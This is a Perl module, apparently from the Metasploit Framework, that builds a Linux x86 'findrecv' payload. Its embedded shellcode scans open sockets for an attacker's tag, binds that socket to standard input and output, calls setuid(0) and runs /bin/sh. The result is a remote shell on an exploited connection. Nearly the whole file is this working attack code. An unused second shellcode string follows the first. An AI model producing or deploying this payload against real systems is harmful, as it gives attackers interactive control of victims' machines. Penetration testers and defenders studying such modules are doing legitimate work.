package Msf::Payload::linx86_findrecv;
use strict;
use base 'Msf::PayloadComponent::FindRecvConnection';

my $advanced = {
  'FindTag' => ['msf!', 'Tag sent and checked for by payload'],
};

my $info =
{
  'Name'         => 'linx86findrecv',
  'Version'      => '$Revision$',
  'Description'  => 'Spawn a shell on the established connection',
  'Authors'      => [ 'spoonm', ],
  'Arch'         => [ 'x86' ],
  'Priv'         => 0,
  'OS'           => [ 'linux' ],
  'Size'         => '',
};

sub new {
  my $class = shift;
  my $hash = @_ ? shift : { };
  $hash = $class->MergeHash($hash, {'Info' => $info, 'Advanced' => $advanced});
  my $self = $class->SUPER::new($hash, @_);

  $self->_Info->{'Size'} = $self->_GenSize;
  return($self);
}

sub Build {
  my $self = shift;
  return($self->Generate);
}

sub Generate {
  my $self = shift;

  # Get tag and make sure its 4 bytes (pad/truncate)
  my $tag = substr($self->GetLocal('FindTag') . ("\x01" x 4), 0, 4);
#  print "Tag Tag $tag\n";

  my $shellcode = # linux findsock via recv code by spoon
"\xbf\x6d\x73\x66\x21\x31\xf6\x66\x4e\x31\xd2\x66\xba\xff\x0f\x89".
"\xe0\x6a\x40\x6a\x04\x50\x52\x89\xe1\x6a\x0a\x5b\x6a\x66\x58\xcd".
"\x80\x83\xec\xf0\x39\x3c\x24\x74\x0b\x4a\x79\xe3\x4e\x79\xda\x31".
"\xc0\x40\xcd\x80\x89\xd3\x6a\x02\x59\x6a\x3f\x58\xcd\x80\x49\x79".
"\xf8\x6a\x17\x58\x31\xdb\xcd\x80\x6a\x0b\x58\x99\x52\x68\x2f\x2f".
"\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80";



"\xbf\x6d\x73\x66\x21\x31\xc9\x66\xb9\xff\xff\x51\x66\xb9\xff\x0f".
"\x51\x89\xe0\x6a\x40\x6a\x04\x50\x31\xdb\xb3\x0a\xb1\xff\x51\x89".
"\xe1\x89\xd8\xb0\x66\xcd\x80\x59\x39\x7c\x24\x0c\x74\x0e\x49\x79".
"\xed\x83\xec\xf0\x59\xe2\xd4\x31\xc0\x40\xcd\x80\x89\xcb\x6a\x02".
"\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x6a\x17\x58\x31\xdb\xcd\x80".
"\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89".
"\xe3\x52\x53\x89\xe1\xcd\x80";

  substr($shellcode, 1, 4, $tag);

  return($shellcode);
}

sub _GenSize {
  my $self = shift;
  my $bin = $self->Generate;
  return(length($bin));
}

1;
